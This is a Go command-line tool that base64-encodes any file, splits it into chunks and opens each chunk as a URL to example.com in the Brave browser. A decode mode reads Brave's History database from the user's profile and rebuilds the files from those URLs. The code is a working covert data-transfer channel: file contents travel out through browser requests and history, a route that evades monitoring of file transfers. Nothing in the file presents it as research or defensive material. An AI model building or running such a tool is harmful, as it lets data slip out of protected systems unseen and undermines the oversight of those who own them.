package main

import (
	"database/sql"
	"encoding/base64"
	"fmt"
	"log"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"

	_ "modernc.org/sqlite"
)

func chunkString(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func openInBrave(url string, browserPath string) error {
	if browserPath == "" {
		// Change this path to match your OS and Brave installation
		browserPath = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
	}

	cmd := exec.Command(browserPath, url)
	return cmd.Start()
}

func encodeFileToBrowserOpen(filePath string, browserPath string) {
	fileBytes, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatalf("Failed to read file: %v", err)
	}

	b64Data := url.QueryEscape(base64.StdEncoding.EncodeToString(fileBytes))
	chunks := chunkString(b64Data, 150)

	filename := filepath.Base(filePath)
	b64Filename := url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(filename)))

	for i, chunk := range chunks {
		b64chunknum := url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(strconv.Itoa(i + 1))))
		urlStr := fmt.Sprintf("https://example.com/?filename=%s&chunk=%s&b64data=%s", b64Filename, b64chunknum, chunk)
		err := openInBrave(urlStr, browserPath)
		if err != nil {
			fmt.Printf("Failed to open %s: %v\n", urlStr, err)
		} else {
			fmt.Printf("Opened %s in Brave\n", urlStr)
		}
	}

	fmt.Printf("Inserted %d URLs into the database.\n", len(chunks))
}

// Not in use right now
func encodeFile(filePath string, db *sql.DB) {
	fileBytes, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatalf("Failed to read file: %v", err)
	}

	b64Data := url.QueryEscape(base64.StdEncoding.EncodeToString(fileBytes))
	chunks := chunkString(b64Data, 150)

	filename := filepath.Base(filePath)
	b64Filename := url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(filename)))

	for i, chunk := range chunks {
		b64chunknum := url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(strconv.Itoa(i + 1))))
		urlStr := fmt.Sprintf("https://example.com/?filename=%s&chunk=%s&b64data=%s", b64Filename, b64chunknum, chunk)
		_, err := db.Exec("INSERT INTO urls (url) VALUES (?)", urlStr)
		if err != nil {
			log.Fatalf("Failed to insert url: %v", err)
		}
	}

	fmt.Printf("Inserted %d URLs into the database.\n", len(chunks))
}

func decodeFile(db *sql.DB, outputDir string) {
	rows, err := db.Query("SELECT url FROM urls WHERE url LIKE 'https://example.com/?filename%'")
	if err != nil {
		log.Fatalf("Failed to query database: %v", err)
	}
	defer rows.Close()

	type chunkData struct {
		num   int
		data  string
		fname string
	}
	var allChunks []chunkData

	for rows.Next() {
		var urlStr string
		if err := rows.Scan(&urlStr); err != nil {
			log.Fatal(err)
		}

		u, err := url.Parse(urlStr)
		if err != nil {
			log.Printf("Invalid URL skipped: %s\n", urlStr)
			continue
		}

		q := u.Query()
		b64Filename, _ := url.QueryUnescape(q.Get("filename"))
		b64Filename = strings.ReplaceAll(b64Filename, " ", "+")
		b64chunkNumStr, _ := url.QueryUnescape(q.Get("chunk"))
		b64chunkNumStr = strings.ReplaceAll(b64chunkNumStr, " ", "+")
		b64Data := q.Get("b64data")
		chunkNumBytes, _ := base64.StdEncoding.DecodeString(b64chunkNumStr)
		chunkNum, _ := strconv.Atoi(string(chunkNumBytes))
		fnameBytes, _ := base64.StdEncoding.DecodeString(b64Filename)

		allChunks = append(allChunks, chunkData{
			num:   chunkNum,
			data:  b64Data,
			fname: string(fnameBytes),
		})
	}

	if len(allChunks) == 0 {
		fmt.Println("No matching URLs found.")
		return
	}

	chunksByFile := map[string][]chunkData{}
	for _, c := range allChunks {
		chunksByFile[c.fname] = append(chunksByFile[c.fname], c)
	}

	for fname, chunks := range chunksByFile {
		sort.Slice(chunks, func(i, j int) bool { return chunks[i].num < chunks[j].num })

		var combined strings.Builder
		for _, c := range chunks {
			combined.WriteString(c.data)
		}
		combinedStr, _ := url.QueryUnescape(combined.String())
		combinedStr = strings.ReplaceAll(combinedStr, " ", "+")
		fmt.Println(combinedStr)
		decoded, err := base64.StdEncoding.DecodeString(combinedStr)
		if err != nil {
			log.Fatalf("Failed to decode base64: %v", err)
		}

		outPath := filepath.Join(outputDir, fname)
		err = os.WriteFile(outPath, decoded, 0644)
		if err != nil {
			log.Fatalf("Failed to write file: %v", err)
		}

		fmt.Printf("Reconstructed file saved to: %s\n", outPath)
	}
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage:")
		fmt.Println("  Encode: program encode <file> <browserPath>")
		fmt.Println("  Decode: program decode <output_dir> <db_file>")
		return
	}

	mode := os.Args[1]
	fmt.Println("Mode:", mode)
	switch mode {
	case "encode":
		var browserPath string

		if len(os.Args) < 4 {
			browserPath = ""
		} else {
			browserPath = os.Args[3]
		}

		filePath := os.Args[2]

		encodeFileToBrowserOpen(filePath, browserPath)

	case "decode":
		var dbFile string
		if len(os.Args) < 4 {
			// Try to auto-detect Brave history file for current user
			userDir, err := os.UserHomeDir()

			if err != nil {
				log.Fatalf("Failed to get user home directory: %v", err)
			}
			// Default Brave profile path for Windows
			dbFile = filepath.Join(userDir, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
			fmt.Printf("Auto-detected Brave history file: %s\n", dbFile)
		} else {
			dbFile = os.Args[3]
		}
		db, err := sql.Open("sqlite", dbFile)
		if err != nil {
			log.Fatalf("Failed to open database: %v", err)
		}
		defer db.Close()

		outputDir := os.Args[2]
		decodeFile(db, outputDir)

	default:
		fmt.Println("Unknown mode. Use 'encode' or 'decode'.")
	}
}
